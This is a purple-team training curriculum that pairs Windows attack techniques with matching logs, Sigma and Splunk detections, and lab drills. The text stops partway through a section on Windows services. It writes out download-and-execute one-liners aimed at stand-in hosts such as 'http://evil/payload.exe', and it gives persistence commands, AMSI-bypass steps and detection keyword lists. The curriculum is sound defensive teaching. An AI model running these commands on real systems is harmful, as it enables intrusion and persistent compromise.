title: Purple Team — The Unicorn Curriculum
description: Offense-defense fusion curriculum teaching every attack alongside its detection. The unicorn rule in practice: no technique taught without its counterpart.

modules.title: Purple Team Foundations — Methodology, Frameworks & Coverage Mapping
modules.objective: Learner can plan and execute a purple team exercise end-to-end, using ATT&CK and D3FEND to map coverage gaps and track results in VECTR.

topics.title: What Is a Purple Team Exercise?
concepts: Red team (offense) and blue team (defense) collaborate in real-time rather than working in silos
Purple teaming is an 'open-book exam' — both sides know the plan and improve together
Continuous feedback loop: attack then detect then analyze then improve detection then re-attack
Difference between purple teaming, red teaming, and penetration testing
VECTR platform as the central tracker for red+blue activities and ATT&CK heatmaps
key_facts: Traditional red team exercises can take weeks; purple team cycles can be run in days or hours
VECTR (Security Risk Advisors) is the most widely used free purple-team tracking platform
The goal is not just finding gaps but closing them with new detections in the same session

attack_side.technique: Red side emulates adversary TTPs mapped to ATT&CK techniques during a planned exercise window
attack_steps: Select target ATT&CK techniques and build emulation plan
Deploy adversary emulation tools (Atomic Red Team, CALDERA, custom payloads)
Execute technique against production or lab environment while blue team watches live
Record timestamps of each attack action for correlation with detection logs

defense_side.what_to_detect: Blue team monitors SIEM/EDR in real-time during the exercise, attempting to detect each red action and measure detection latency
logs: Sysmon Events 1/3/7/8/10/11/13
Windows Security 4688/4624/4672
Zeek conn/dns/http logs
detection_rules: Sigma rules mapped to each ATT&CK technique tested
EDR behavioral detections

topics.gap_analysis: Most organizations discover that they detect <40% of ATT&CK techniques on first exercise. Common gaps: no Sysmon deployed, PowerShell logging disabled, no network-level visibility.
drills: Run a 1-day purple team sprint: pick 10 ATT&CK techniques, execute Atomic Red Team tests, measure detection rate, build detections for gaps, re-test.
common_mistakes: Treating purple teaming as a one-time exercise rather than continuous practice
Not involving the blue team in planning the attack scenarios
Focusing on technique count rather than detection quality

topics.title: ATT&CK & D3FEND — The Offense-Defense Knowledge Graphs
concepts: MITRE ATT&CK: taxonomy of adversary tactics, techniques, and procedures (TTPs) organized by tactics (Initial Access through Impact)
MITRE D3FEND: complementary knowledge base mapping defensive countermeasure techniques to specific offensive techniques
D3FEND organizes defenses into categories: Harden, Detect, Isolate, Deceive, Evict
ATT&CK Navigator visualizes detection coverage as a heatmap across the technique matrix
D3FEND provides formal mappings from ATT&CK mitigations to defensive technique IDs
key_facts: ATT&CK Enterprise matrix has 14 tactics and 600+ techniques/sub-techniques
D3FEND was first released in 2021 by MITRE with NSA sponsorship
ATT&CK Navigator supports layering: one layer for detection coverage, one for adversary group behavior, one for test coverage
DeTTECT (Detection Tactics Techniques and Coverage) is a free tool that maps detections, visibility, and adversary emulation to ATT&CK

attack_side.technique: Use ATT&CK Navigator adversary group layers (e.g., APT29, FIN7) to understand which techniques real threat actors use
attack_steps: Select a threat actor profile from ATT&CK (e.g., G0016 = APT29)
Import the group technique list into ATT&CK Navigator
Overlay this with your detection coverage layer to identify critical gaps
Prioritize emulation of techniques used by your most relevant threat actors

defense_side.what_to_detect: Map every detection rule and log source to specific ATT&CK technique IDs, then visualize coverage gaps
logs: All log sources tagged with ATT&CK technique IDs in SIEM
detection_rules: Sigma rules with tags field mapping to ATT&CK (tags: attack.t1059.001)
DeTTECT YAML visibility/detection files

topics.gap_analysis: Coverage mapping reveals that most organizations have strong coverage in Execution and Persistence but blind spots in Collection, Exfiltration, and Defense Evasion. Prioritize gaps where threat actor techniques overlap with zero detections.
drills: Build a complete ATT&CK Navigator layer for your organization current detection coverage. Identify the top 10 highest-risk gaps (techniques used by relevant threat actors with no detection).
common_mistakes: Confusing log collection with detection capability — collecting logs is not the same as having detections
Not scoring detections by confidence (a noisy rule is not real coverage)
Ignoring D3FEND entirely and only focusing on ATT&CK offense

topics.title: Adversary Emulation Toolkit — Atomic Red Team, CALDERA, Prelude
concepts: Atomic Red Team: library of small simple tests mapped to ATT&CK — easiest entry point for purple teaming
CALDERA: MITRE automated adversary emulation platform that chains techniques into full attack workflows using agents
Prelude Operator: adversary emulation platform with ATT&CK-mapped tests and a programmable probe
Mordor Project: pre-recorded datasets of adversarial techniques for offline detection development
Scythe and Inverno: commercial enterprise-grade adversary emulation with full reporting
key_facts: Atomic Red Team has 2000+ test definitions mapped to ATT&CK executable with a single command
CALDERA uses a C2 architecture with Sandcat agent and supports automated adversary profiles
Prelude Operator community edition is free and supports Windows and Linux probes
Red Canary Atomic Red Team tests are the industry standard for validating individual detections

attack_side.technique: Run Atomic Red Team atomics to validate detection for specific ATT&CK techniques in a controlled manner
attack_steps: Install Atomic Red Team (Invoke-AtomicRedTeam PowerShell module)
Select target technique (e.g., T1003.001 LSASS Memory) and run Invoke-AtomicTest T1003.001
For automated chains: deploy CALDERA Sandcat agent select adversary profile run operation
For Prelude: install probe deploy attack module execute test campaign

defense_side.what_to_detect: Validate that detection rules fire correctly when known attack techniques are executed — measure if alerts were generated and with what latency
logs: SIEM alerts
EDR console
Sysmon operational log
Windows Defender event log 1116/1117
detection_rules: Sigma rules for each technique being tested
EDR custom detection rules

topics.gap_analysis: Running Atomic Red Team often reveals that detections exist but dont fire due to misconfigured log forwarding incorrect Sigma backend or EDR exclusion paths. Always verify end-to-end from test execution to SIEM alert.
drills: Run 20 Atomic Red Team tests across 5 ATT&CK tactics. For each record whether a detection fired the time to alert and the log source that caught it. Build new detections for any that were missed.
common_mistakes: Running atomics on production without understanding impact
Not checking that logs actually reach the SIEM before declaring a detection gap
Using only one tool — different tools generate different telemetry patterns

topics.title: Detection Engineering Lifecycle — From TTP to Sigma Rule
concepts: Detection engineering is the 6-phase lifecycle: hypothesis then develop then test then deploy then monitor then improve
Sigma: open-standard vendor-agnostic rule format for SIEM detections (like YAML for detection rules)
YARA: pattern-matching tool for identifying malware in files and memory by binary/text signatures
Detection-as-code: treat detection rules like software with version control CI/CD and automated testing
Rule lifecycle management: track false positive rate detection confidence and ATT&CK coverage over time
key_facts: Sigma rules are convertible to Splunk SPL Elastic KQL Microsoft KQL and 30+ backend formats using sigma-cli
YARA rules support conditions like hex strings regex and offset-based matching
A well-engineered detection includes the rule its ATT&CK mapping known false positives and a documented response procedure
Sigma rule YAML structure: title status description logsource detection selection/filter/condition level tags

attack_side.technique: Analyze an attack technique behavior to understand what telemetry it generates then verify your detection catches it
attack_steps: Study the ATT&CK technique page for procedure examples and detection recommendations
Execute the technique in a lab using Atomic Red Team or manual methods
Collect all generated logs (Sysmon Windows Event EDR network) for analysis
Identify the highest-fidelity indicator that distinguishes malicious from benign activity

defense_side.what_to_detect: Write a Sigma rule that matches the attack unique telemetry pattern while filtering known-good activity
logs: Sysmon Event 1 (Process Creation)
Sysmon Event 11 (File Creation)
Windows Security 4688
PowerShell ScriptBlock 4104
detection_rules: Sigma: proc_creation_win_susp_powershell_encoded_command
Sigma: proc_creation_win_mimikatz_command
YARA: rule Mimikatz_Sig { strings: $a = "sekurlsa" condition: $a }

topics.gap_analysis: Many detections are written but never tested against real attacks leading to rules that look correct but never fire. Always validate with adversary emulation. Common gap: Sigma rule is written but never converted to the SIEM backend.
drills: Take T1558.003 (Kerberoasting). Execute Rubeus kerberoast in lab. Capture logs. Write a Sigma rule. Convert to your SIEM language. Verify it fires. Document false positives. Enter into Git.
common_mistakes: Writing detections for noise rather than fidelity
Not documenting false positives and tuning instructions
Forgetting to tag rules with ATT&CK technique IDs for coverage mapping

modules.title: Initial Access — Phishing vs. Email Security & Edge Defenses
modules.objective: Learner can execute phishing and exploitation attacks and build detections that catch them at the gateway endpoint and network.

topics.title: Spearphishing Attachment (T1566.001) vs. Email Security Gateway
concepts: Phishing accounts for 40%+ of initial access incidents (Verizon DBIR 2025)
Spearphishing attachments: malicious Office documents (macro/OLE) PDFs ISO/IMG files LNK files
Modern attachment attacks use HTML smuggling or container files (zip iso vhd) to bypass MOTW
Mark-of-the-Web (MOTW): Windows zone identifier that flags files from the internet — many attacks aim to strip or bypass it
Email security layers: SPF DKIM DMARC for authentication; sandbox detonation for attachments; URL rewriting for links
key_facts: Median time from email delivery to first malicious action is under 60 minutes
DMARC rejection policy (p=reject) can block 80%+ of spoofed domain phishing
Office macros are disabled by default since 2022 shifting attackers to ISO/LNK/HTML smuggling
Sysmon Event 11 (FileCreate) can detect when email attachment files are written to disk

attack_side.technique: Craft and deliver a spearphishing email with a malicious attachment that executes code on the victim endpoint
attack_steps: Recon target: identify email addresses job roles and organizational context via OSINT (LinkedIn website)
Craft lure email with relevant subject and pretext (invoice HR document shared file)
Create malicious payload: macro-enabled document HTML smuggling page or ISO-embedded LNK
Deliver via email (bypassing/avoiding gateway) or via direct messaging (Teams Slack)
Payload executes on user click: downloads second-stage beacon or runs embedded shellcode

defense_side.what_to_detect: Detect phishing by correlating email delivery logs with subsequent suspicious process executions on endpoints
logs: Microsoft 365 mail flow logs
Windows Security Event 4688 (Process Creation with command line)
Sysmon Event 1 (Process Creation) + Event 11 (File Create) + Event 22 (DNS Query)
Office apps alert logs
detection_rules: Sigma: proc_creation_win_office_product_spawning_process (Office app spawning cmd/powershell/wscript)
Sigma: proc_creation_win_office_product_dropping_dll
Sigma: file_create_win_iso_mounting (ISO/IMG file creation from email client process)

topics.gap_analysis: HTML smuggling attacks bypass email gateways because the malicious payload is constructed client-side in the browser. ISO/IMG attachments bypass MOTW meaning SmartScreen and AppLocker may not flag them. Detect at the endpoint by monitoring for unusual process ancestry (email client then browser then shell).
drills: Send a Gophish phishing campaign with a benign macro document. Track: did the email gateway block it? Did the sandbox detonate it? If delivered did EDR catch the macro execution? Measure detection rate at each layer.
common_mistakes: Relying solely on the email gateway — defense in depth requires endpoint detection too
Not testing against modern attachment types (ISO HTML smuggling) that bypass traditional filtering
Forgetting to correlate email delivery time with endpoint activity for end-to-end visibility

topics.title: Spearphishing Link (T1566.002) vs. URL Rewriting & Safe Links
concepts: Spearphishing links direct users to credential harvesting pages or drive-by download sites
Adversary-in-the-middle (AiTM) phishing proxies relay credentials AND MFA tokens in real-time (Evilginx Modlishka)
URL rewriting (Safe Links Proofpoint URL Defense) wraps links at delivery time for click-time evaluation
QR code phishing (quishing) embeds malicious URLs in images to bypass URL scanners
Link analysis: reputation scoring domain age redirect chains certificate transparency logs
key_facts: AiTM phishing can bypass MFA by relaying the session cookie after successful authentication
Newly registered domains (NRDs) are a strong phishing indicator — many appear within 24 hours of the campaign
URL rewriting only protects at click time if the backend reputation service is current
QR code phishing increased 400%+ in 2023-2024 because image-based payloads evade URL scanning

attack_side.technique: Deliver a credential harvesting link via email that captures user credentials and/or bypasses MFA
attack_steps: Register lookalike domain or compromise legitimate site for hosting
Set up credential harvesting page or AiTM reverse proxy (Evilginx2)
Craft email with embedded link using URL shortener or open-redirect to obscure destination
Victim clicks link enters credentials attacker captures or relays session token

defense_side.what_to_detect: Detect credential submission to untrusted domains newly registered domains in email and AiTM proxy behavior
logs: Email gateway URL category and reputation logs
Proxy/SWG logs showing credential submissions to external sites
Windows Event 4624 (interactive logon) from unexpected geographic locations
Azure AD sign-in logs with impossible travel patterns
detection_rules: Sigma: detect outbound credential submission to newly registered domain (<7 days old)
Azure Sentinel: impossible travel detection rule
Sigma: detect authentication from IP not seen in last 90 days
tools: Microsoft Defender for Office Safe Links
controls: FIDO2 hardware security keys (resist AiTM phishing)

topics.gap_analysis: AiTM phishing bypasses MFA because it steals the session token post-authentication. FIDO2/WebAuthn is the only MFA resistant to AiTM because it cryptographically binds authentication to the origin domain. Gap: many organizations have OATH TOTP which is trivially phishable.
drills: Set up Evilginx2 in lab against a test tenant. Demonstrate MFA bypass. Then show how FIDO2 (hardware key) blocks the same attack. Write a detection for unusual session token usage patterns.
common_mistakes: Believing MFA alone prevents phishing — TOTP/SMS MFA is bypassable with AiTM
Not monitoring for newly registered domains in email links
Ignoring QR code phishing vectors

topics.title: Exploit Public-Facing Application (T1190) vs. WAF & Patching
concepts: Exploiting vulnerabilities in internet-facing applications (web apps VPN email servers RDP)
Common targets: Log4Shell (CVE-2021-44228) ProxyLogon (CVE-2021-26855) Citrix Bleed (CVE-2023-4966) MOVEit (CVE-2023-34362)
WAF (Web Application Firewall): inspects HTTP traffic for attack patterns (SQLi XSS RCE SSRF)
Intrusion Detection/Prevention (IDS/IPS): signature and anomaly-based network attack detection
Internet-exposed service inventory: knowing what is exposed is prerequisite to defending it
key_facts: Mean time to exploitation of a public CVE is often under 30 days after PoC release
CISA Known Exploited Vulnerabilities (KEV) catalog lists vulnerabilities actively exploited in the wild
Log4Shell allowed unauthenticated RCE via crafted JNDI strings in HTTP headers
60% of breach entries involve an unpatched known vulnerability

attack_side.technique: Identify and exploit a vulnerability in an internet-facing application to gain initial code execution
attack_steps: Enumerate external attack surface (Shodan Censys nmap) for exposed services and versions
Identify known vulnerabilities matching the detected versions (CVE databases ExploitDB)
Craft exploit payload (e.g., JNDI injection for Log4Shell SSRF for ProxyLogon)
Deliver payload and gain remote code execution or unauthorized access

defense_side.what_to_detect: Detect exploitation attempts via WAF signatures IDS alerts and anomalous application behavior (unexpected outbound connections new processes)
logs: WAF logs (ModSecurity Cloudflare AWS WAF) with attack signatures matched
Network IDS alerts (Suricata Snort) with CVE-specific rulesets
Web server access logs with suspicious payloads in headers/parameters
Sysmon Event 1 (new process from web server process like w3wp.exe java.exe)
detection_rules: Sigma: proc_creation_win_webserver_spawning_shell (IIS/Apache/nginx spawning cmd/powershell)
Suricata ruleset: ET Open / ET Pro for known CVE exploit signatures
ModSecurity OWASP CRS rules for SQLi/XSS/RCE patterns

topics.gap_analysis: Many WAFs run in detection-only mode. Legacy applications may not support modern WAF rules. Zero-day exploits bypass signature-based IDS. Gap: organizations often lack egress monitoring to detect post-exploitation C2 beaconing from compromised web servers.
drills: Deploy a vulnerable DVWA or Log4Shell-vulnerable app. Run Nuclei and Metasploit against it. Confirm WAF/IDS catches the attacks. Then deploy patches and re-test to confirm prevention.
common_mistakes: Prioritizing patching by CVSS score alone rather than CISA KEV + exploitability + exposure
Running WAF in monitor-only mode indefinitely
Not scanning for shadow IT / unmanaged internet-facing assets

modules.title: Execution — PowerShell & Scripting Attacks vs. AMSI, Logging & CLM
modules.objective: Learner can execute PowerShell-based attacks and configure the full detection stack: Script Block Logging, AMSI, CLM, and Sysmon.

topics.title: PowerShell Attacks (T1059.001) vs. Script Block Logging (Event 4104)
concepts: PowerShell is the #1 most-used execution technique by adversaries due to its ubiquity on Windows
Script Block Logging (Event 4104): logs the actual de-obfuscated code that PowerShell executes even when obfuscated at input
Script Block Logging captures code AFTER the parser and engine process it — defeating most obfuscation
Module Logging (Event 4103): logs pipeline execution details of modules
PowerShell v5+ Script Block Logging can capture AMSI bypass attempts in the log itself
key_facts: Enable via GPO: Computer Configuration > Admin Templates > Windows Components > PowerShell > Turn on PowerShell Script Block Logging
Event 4104 fires at script block compilation capturing the full code including decoded content
Event 4104 with level Warning indicates the script was flagged as suspicious
Event 4103 (Module Logging) must be explicitly enabled per-module

attack_side.technique: Use PowerShell to execute malicious commands including obfuscated payloads downloading and running in-memory scripts
attack_steps: Execute obfuscated PowerShell command (base64 character substitution concatenation)
Download and execute script in memory: IEX (New-Object Net.WebClient).DownloadString(url)
Invoke Reflective PE loading for in-memory DLL/EXE execution (Invoke-Mimikatz PowerView)
Use PowerShell one-liners for quick reconnaissance lateral movement and credential theft

defense_side.what_to_detect: Script Block Logging (Event 4104) captures the de-obfuscated code — hunt for malicious patterns in the logged script content
logs: PowerShell Event 4104 (ScriptBlock) — Microsoft-Windows-PowerShell/Operational
PowerShell Event 4103 (Module) — pipeline execution details
Sysmon Event 1 (Process Creation) — powershell.exe with command line arguments
Windows Security Event 4688 (Process Creation with command line auditing enabled)
detection_rules: Sigma: posh_ps_invoke_obfuscation — detects known obfuscation patterns in script blocks
Sigma: posh_ps_suspicious_download — detects IEX/DownloadString/DownloadFile patterns
Sigma: posh_ps_mimikatz_keywords — detects Mimikatz cmdlets in script blocks
Splunk: index=powershell EventCode=4104 | search (IEX OR DownloadString OR Invoke-Mimikatz OR Add-Type)

topics.gap_analysis: Script Block Logging only captures what the PowerShell engine compiles. Attackers who call .NET APIs directly (e.g., via C# inline compilation) or use alternative PowerShell hosts may evade 4104 events. Gap: many orgs enable 4104 but dont actually monitor or alert on it.
drills: Run 5 obfuscated PowerShell commands using Invoke-Obfuscation. Check: did Event 4104 capture the de-obfuscated code? Write Sigma rules to detect the decoded payloads. Verify rules fire in SIEM.
common_mistakes: Enabling Script Block Logging but not forwarding Event 4104 to the SIEM
Only monitoring powershell.exe and not detecting PowerShell execution via other hosts (C# assemblies loading SMA.dll)
Not hunting in 4104 events — they contain gold but are often unused

topics.title: PowerShell vs. AMSI & Constrained Language Mode
concepts: AMSI (Antimalware Scan Interface): Windows security interface that allows AV/EDR to inspect script content before execution
AMSI inspects PowerShell VBScript JavaScript and Office VBA macros at runtime
Constrained Language Mode (CLM): restricts PowerShell to basic operations — blocks COM .NET type invocation and Win32 API calls
CLM is enforced when AppLocker or WDAC (Windows Defender Application Control) is in enforce mode
AMSI + Script Block Logging + CLM form the triple threat defense for PowerShell
key_facts: AMSI is enabled by default on Windows 10+ with Windows Defender registered as the AMSI provider
CLM disables the ability to call Add-Type use COM objects or invoke .NET methods interactively
AMSI bypass via patching AmsiScanBuffer in memory is one of the most common attacker techniques
Script Block Logging captures the AMSI bypass attempt code in Event 4104 even if the bypass succeeds

attack_side.technique: Bypass AMSI to run in-memory PowerShell payloads then execute post-exploitation tooling
attack_steps: Attempt AMSI bypass: patch AmsiScanBuffer function to return AMSI_RESULT_CLEAN
Alternative bypasses: force AMSI error (amsiInitFailed) use reflection hardware breakpoint or load CLR before AMSI hooks
Once bypassed: execute in-memory Mimikatz download PowerSploit modules run Empire stager
If CLM is enforced: bypass via COM serialization MSBuild lateral execution or compiling to disk EXE

defense_side.what_to_detect: Detect AMSI bypass attempts (memory patching error forcing) and CLM circumvention attempts
logs: PowerShell Event 4104 (Script Block) — captures the bypass code itself even if it succeeds
Windows Defender Event 1116/1117 — malware detected by AMSI scan
Sysmon Event 1 — suspicious PowerShell process with AMSI-bypass indicators in command line
AMSI Event 800 (Microsoft-Antimalware-Scan-Interface)
detection_rules: Sigma: posh_ps_amsi_bypass — detects known AMSI bypass patterns in Event 4104 (AmsiScanBuffer amsiInitFailed)
Sigma: posh_ps_clm_bypass — detects Constrained Language Mode circumvention attempts
Splunk: index=powershell EventCode=4104 | search (AmsiScanBuffer OR amsiInitFailed OR System.Management.Automation.AmsiUtils)

topics.gap_analysis: AMSI bypass via memory patching is fileless and doesnt create disk artifacts. However Script Block Logging (4104) captures the bypass code itself. The real gap: many bypass techniques for CLM exist via MSBuild InstallUtil or custom .NET assemblies that dont go through the PowerShell engine at all.
drills: Execute a known AMSI bypass. Confirm Event 4104 captured the bypass code. Write a Sigma rule to alert on it. Then enable CLM via AppLocker and show how PowerSploit modules fail. Attempt a CLM bypass and detect it.
common_mistakes: Thinking AMSI alone stops PowerShell attacks — it only inspects content bypasses are well-documented
Not enabling CLM because of fear of breaking admin scripts (test in audit mode first)
Ignoring that the AMSI bypass attempt IS itself a high-fidelity detection signal

topics.title: Living Off the Land Binaries (T1218) vs. Process Monitoring
concepts: LOLBins: legitimate signed Windows binaries abused by attackers to execute code download files or bypass defenses
Key LOLBins: mshta.exe rundll32.exe regsvr32.exe certutil.exe msbuild.exe installutil.exe wmic.exe forfiles.exe
Each LOLBin has a legitimate purpose but can be used to proxy-execute malicious content (script DLL COM object)
Detection relies on process ancestry analysis: which parent spawned the LOLBin and what arguments were passed
AMSI inspects some LOLBin-launched scripts (mshta wscript) but not all
key_facts: GTFOBins and LOLBAS project catalog 100+ abusable binaries and their attack patterns
regsvr32 /s /u /i:http://evil.sct scrobj.dll (squiblydoo) bypasses application whitelisting
mshta can execute inline VBScript/JavaScript from a URL without writing to disk
certutil.exe can download files: certutil -urlcache -split -f http://evil/payload.exe file.exe

attack_side.technique: Use LOLBins to execute payloads while evading application whitelisting and blending with legitimate activity
attack_steps: Identify available LOLBins that arent blocked by AppLocker/WDAC
Use mshta to execute inline HTA with VBScript payload from URL
Use rundll32 to execute malicious DLL or JavaScript via advpack.dll
Use certutil or bitsadmin to download second-stage payload
Chain LOLBins: cmd > certutil (download) > rundll32 (execute) for stealth

defense_side.what_to_detect: Detect LOLBins executing with suspicious arguments unusual parent processes or making network connections
logs: Sysmon Event 1 (Process Creation) with command line
Sysmon Event 3 (Network Connection) from LOLBin processes
Sysmon Event 7 (Image Loaded) — DLLs loaded by LOLBins
Sysmon Event 22 (DNS Query) from LOLBin processes
Windows Security Event 4688 with command line logging
detection_rules: Sigma: proc_creation_win_mshta_execution — mshta.exe with URL or inline script arguments
Sigma: proc_creation_win_certutil_download — certutil.exe with -urlcache or -decode flags
Sigma: proc_creation_win_regsvr32_squiblydoo — regsvr32 with /s /u /i:http patterns
Sigma: proc_creation_win_lolbin_with_network — any LOLBin making unexpected network connections
controls: ASR Rules (block Office apps from creating child processes)

topics.gap_analysis: LOLBins are legitimate tools so blocking them entirely breaks administration. Detection must focus on arguments and parent-child relationships not just the binary name. Gap: many orgs dont enable Sysmon command-line logging (Event 1 with CommandLine field) or Windows 4688 command-line auditing.
drills: Execute 5 LOLBin techniques (squiblydoo mshta inline certutil download rundll32 advpack wmic process call). For each identify which Sysmon events fire. Write Sigma rules for each pattern. Measure false positive rate against a week of production data.
common_mistakes: Alerting on every LOLBin execution (too noisy) — must filter by arguments and parent process
Not correlating LOLBin network connections with process creation for full context
Forgetting that LOLBins work from any process context not just initial access

topics.title: WMI Execution & Persistence (T1047 T1546.003) vs. WMI Monitoring
concepts: Windows Management Instrumentation (WMI): powerful management interface used for remote execution and persistence
WMI event subscriptions: __EventFilter + __EventConsumer + __FilterToConsumerBinding = permanent persistence
Attackers use wmic.exe or direct WMI API calls for lateral movement execution and stealth persistence
WMI persistence survives reboots and doesnt appear in common autoruns locations (registry run keys startup folder)
WMI consumers can be CommandLineEventConsumer (run any command) or ActiveScriptEventConsumer (run VBScript/JScript)
key_facts: WMI permanent event subscriptions are stored in the CIM repository (C:\Windows\System32\wbem\Repository)
wmic process call create cmd.exe /c payload executes on local or remote systems
WMI persistence is invisible to Sysinternals Autoruns unless you check the WMI tab
WMI event subscriptions can be triggered by timed events process creation or log events

attack_side.technique: Use WMI for remote execution lateral movement and permanent persistence via event subscriptions
attack_steps: Remote execution: wmic /node:TARGET process call create powershell -enc payload
Persistence: create __EventFilter (trigger on specific event or timer)
Create CommandLineEventConsumer (command to execute)
Create __FilterToConsumerBinding (link filter to consumer)
Persistence triggers automatically on system events surviving reboots

defense_side.what_to_detect: Detect WMI permanent event subscription creation and suspicious wmic.exe usage
logs: Sysmon Event 19 (WmiEventFilter) Event 20 (WmiEventConsumer) Event 21 (WmiEventConsumerToFilter)
Sysmon Event 1 (wmic.exe process creation with command line)
Windows Security Event 4648 (explicit credentials logon) for WMI remote connections
Microsoft-Windows-WMI-Activity/Operational log
detection_rules: Sigma: wmi_pers — Sysmon Events 19/20/21 for WMI permanent event subscriptions
Sigma: proc_creation_win_wmic_process_creation — wmic process call create with suspicious arguments
Baseline WMI subscriptions: query root\subscription for EventFilter EventConsumer FilterToConsumerBinding objects

topics.gap_analysis: WMI persistence is frequently missed because its not in registry autorun locations. Many organizations dont deploy Sysmon with WMI event monitoring enabled. Gap: WMI events require specific Sysmon configuration — the default SwiftOnSecurity config includes them but many custom configs omit them.
drills: Create a WMI permanent event subscription for persistence. Verify it survives reboot. Then hunt for it using Sysmon Events 19/20/21 and manual WMI namespace queries. Write a detection and validate it fires on subscription creation.
common_mistakes: Not including WMI event monitoring in Sysmon configuration
Forgetting to check WMI during threat hunting and IR
Thinking Autoruns catches all persistence — it has a WMI tab but many hunters skip it

modules.title: Persistence — Autostart Execution vs. Registry & Service Monitoring
modules.objective: Learner can establish persistence using common techniques and deploy detections that catch them via Sysmon, Autoruns, and behavioral monitoring.

topics.title: Registry Run Keys (T1547.001) vs. Sysmon Registry Monitoring
concepts: Registry Run keys: HKLM/HKCU\Software\Microsoft\Windows\CurrentVersion\Run — programs that execute at logon
Additional persistence locations: RunOnce RunServices Winlogon\Shell Winlogon\Userinit Explorer\Run
Startup folder: %AppData%\Microsoft\Windows\Start Menu\Programs\Startup — files execute at logon
Sysmon registry events: Event 12 (Registry create/delete) Event 13 (Registry value set) Event 14 (Registry rename)
Autoruns: Sysinternals tool that catalogs all autostart locations for baseline and hunting
key_facts: Registry Run keys are the #1 most common persistence technique in ATT&CK (T1547.001)
Sysmon Event 13 fires when a registry value is SET — this is the key event for run key detection
Autoruns categorizes 100+ autostart extensibility points (ASEPs) across the system
Run keys in HKLM execute for ALL users; HKCU execute only for the specific user

attack_side.technique: Add a program to registry Run keys or startup folder to execute automatically at next logon
attack_steps: Identify target executable (beacon payload backdoor scheduled task creator)
Add registry value: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d C:\Users\Public\payload.exe
Alternative: use reg.exe PowerShell Set-ItemProperty or direct Win32 API calls
Payload executes at next user logon with user privileges

defense_side.what_to_detect: Detect modifications to registry persistence locations using Sysmon registry monitoring (Events 12/13/14)
logs: Sysmon Event 13 (Registry Value Set) — filter TargetObject for *\Run\* *\RunOnce\* *\Winlogon\*
Sysmon Event 12 (Registry Key Create) — new registry keys in autostart locations
Windows Security Event 4657 (Registry Value Modified) — if registry auditing is enabled
Sysmon Event 1 (Process Creation) at logon — programs started by explorer.exe or userinit.exe
detection_rules: Sigma: registry_event_run_key_persistence — Sysmon Event 13 targeting Run/RunOnce keys
Sigma: registry_event_winlogon_helper — modifications to Winlogon Shell/Userinit values
Splunk: index=sysmon EventCode=13 TargetObject=*\CurrentVersion\Run\* | stats by Computer Image TargetObject Details
Baseline: compare Autoruns output against known-good baseline to detect new autostart entries

topics.gap_analysis: Some persistence locations are not covered by default Sysmon registry filters. Non-standard startup registry keys may evade Autoruns. Gap: many orgs dont baseline their autostart entries making it impossible to detect new additions.
drills: Plant persistence in 5 locations (HKLM Run HKCU Run Startup folder Winlogon Userinit RunOnce). For each verify Sysmon Event 13 fires. Then use Autoruns to find all 5. Write a Sigma rule covering all locations.
common_mistakes: Only monitoring HKLM Run and forgetting HKCU Run or less-common locations
Not establishing an Autoruns baseline for comparison
Alerting on every registry change (too noisy) — must filter for persistence-specific paths

topics.title: Scheduled Tasks (T1053.005) vs. Task Scheduler Monitoring
concepts: Scheduled tasks: Windows Task Scheduler programs that run on triggers (time logon event idle)
Attackers create scheduled tasks for persistence privilege escalation and execution timing
schtasks.exe or COM ITaskService can create tasks; tasks can run as SYSTEM for privilege escalation
Task XML is stored in C:\Windows\System32\Tasks\ and C:\Windows\Tasks\
Detection: monitor for new task creation especially by non-standard processes or with suspicious actions
key_facts: Scheduled tasks can run with highest privileges (SYSTEM) if created by an admin
schtasks /create /tn TaskName /tr payload.exe /sc ONLOGON /ru SYSTEM
Task Scheduler logs are in Microsoft-Windows-TaskScheduler/Operational (Event 106 = task registered)
Sysmon can monitor for schtasks.exe creation (Event 1) with suspicious arguments

attack_side.technique: Create a scheduled task that executes a malicious payload on a trigger (logon startup or recurring)
attack_steps: Create task with schtasks: schtasks /create /tn Updater /tr powershell -enc payload /sc ONLOGON /ru SYSTEM /rl HIGHEST
Alternative: use COM objects (Schedule.Service) for stealthier task creation
Task survives reboot and executes payload with SYSTEM privileges
Can also modify existing legitimate tasks to add malicious actions

defense_side.what_to_detect: Detect creation of new scheduled tasks especially with SYSTEM privileges suspicious actions or by unexpected processes
logs: Microsoft-Windows-TaskScheduler/Operational Event 106 (Task Registered)
Sysmon Event 1 (schtasks.exe process creation with /create arguments)
Windows Security Event 4698 (A scheduled task was created)
Sysmon Event 11 (file creation in C:\Windows\System32\Tasks\)
detection_rules: Sigma: proc_creation_win_schtasks_persistence — schtasks /create with ONLOGON ONSTART or SYSTEM user
Sigma: proc_creation_win_schtasks_system — scheduled task running as SYSTEM created by non-standard process
Splunk: index=windows sourcetype=WinEventLog:Microsoft-Windows-TaskScheduler/Operational EventCode=106

topics.gap_analysis: Task Scheduler auditing (Event 4698) requires enabling Advanced Audit Policy. Many orgs dont enable the TaskScheduler/Operational log channel. Gap: attackers can modify existing tasks actions to add malicious steps which may not generate a task created event.
drills: Create a scheduled task for persistence running as SYSTEM. Verify detection via Task Scheduler Event 106 and Sysmon Event 1. Then modify an existing benign task to add a malicious action — does your detection catch the modification?
common_mistakes: Only alerting on schtasks.exe and missing COM-based task creation
Not monitoring for task modifications (only new creation)
Forgetting that tasks can be created on remote systems via AT service or WMI

topics.title: Windows Services (T1543.003) vs. Service Monitoring
concepts: Windows services run in the background can start at boot and often run as SYSTEM
Attackers create malicious services or modify existing ones for persistence and privilege escalation
Service path: sc.exe create New-Service PowerShell or direct registry modification of HKLM\SYSTEM\CurrentControlSet\Services
Unquoted service path vulnerability: if service path has spaces and isnt quoted attacker can plant executables
Detection: monitor for service creation especially with suspicious binary paths or run as SYSTEM
key_facts: Services can be configured as auto-start (boot) and run as LocalSystem for full privilege
sc.exe create ServiceName binPath= C:\path\payload.exe start= auto
Windows Security Event 7045 (Service Installed) fires when a new service is created
Sysmon Event 6 (Driver Load) and Event 1 can detect service binary execution

attack_side.technique: Create a Windows service to achieve persistence and SYSTEM-level execution
attack_steps: Create service: sc create WindowsUpdateSvc binPath= C:\Users\Public\beacon.exe start= auto
Configure as SYSTEM: sc config WindowsUpdateSvc obj= LocalSystem
Start service: sc start WindowsUpdateSvc
Service runs at boot with SYSTEM privileges providing persistent access

defense_side.what_to_detect: Detect new service creation especially with suspicious binary paths or service names mimicking legitimate services
logs: Windows Security Event 7045 (Service Installed / A service was installed in the system)
Sysmon Event 1 (sc.exe or powershell.exe creating service with suspicious arguments)
Windows System Event 7034/7036 (service stopped/started)
